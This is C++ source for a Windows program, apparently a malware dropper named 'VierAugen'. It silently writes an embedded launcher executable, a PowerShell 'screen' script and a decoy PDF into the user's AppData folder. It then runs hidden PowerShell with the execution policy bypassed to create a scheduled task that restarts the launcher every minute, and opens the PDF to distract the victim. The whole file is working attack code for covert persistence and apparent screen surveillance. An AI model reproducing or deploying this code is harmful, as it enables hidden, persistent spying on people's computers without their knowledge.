#include <iostream>
#include <windows.h>
#include <fstream>

#include "addons.h"

using namespace std;

/* I will rather use stack instead of heap, so no global vars */

int i = 246;

const char appfolder_name[] = "\\VierAugen";
char env_appdata_path[MAX_PATH];

void extract_addon(unsigned char addon_data[], int addon_len, const char file_name[]);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) {
	// get appdata path and append app folder name 
	GetEnvironmentVariable("appdata", env_appdata_path, MAX_PATH);

	extract_addon(addon_launcher, sizeof(addon_launcher), "launcher.exe");
	extract_addon(addon_screen_script, sizeof(addon_screen_script), "screen.ps1");
	extract_addon(addon_document, sizeof(addon_document), "document.pdf");

	// scheduler installer as powershell param
	// execute launcher every minute
	// name of scheduled task: calc
	const char scheduler_cmd[] = "-executionpolicy bypass -command \"schtasks /Create /SC MINUTE /MO 1 /TR \"$env:appdata\\VierAugen\\launcher.exe\" /TN vieraugen\"";
	const char document_cmd[] = "-executionpolicy bypass -command \"start-process \"$env:appdata\\VierAugen\\document.pdf\"\"";

	// install scheduled task
	ShellExecute(NULL, "open", "powershell.exe", scheduler_cmd, NULL, SW_HIDE);

	// open document
	ShellExecute(NULL, "open", "powershell.exe", document_cmd, NULL, SW_HIDE);

	return 0;
}


// binary copy an addon to file in the appfolder
void extract_addon(unsigned char addon_data[], int addon_len, const char file_name[])
{
	char addon_path[MAX_PATH];

	strcpy_s(addon_path, env_appdata_path);
	strcat_s(addon_path, appfolder_name);

	CreateDirectory(addon_path, NULL);

	strcat_s(addon_path, "\\");
	strcat_s(addon_path, file_name);

	ofstream output(addon_path, ios::out | ios::binary);
	output.write(reinterpret_cast<char*>(addon_data), addon_len);
	output.close();
}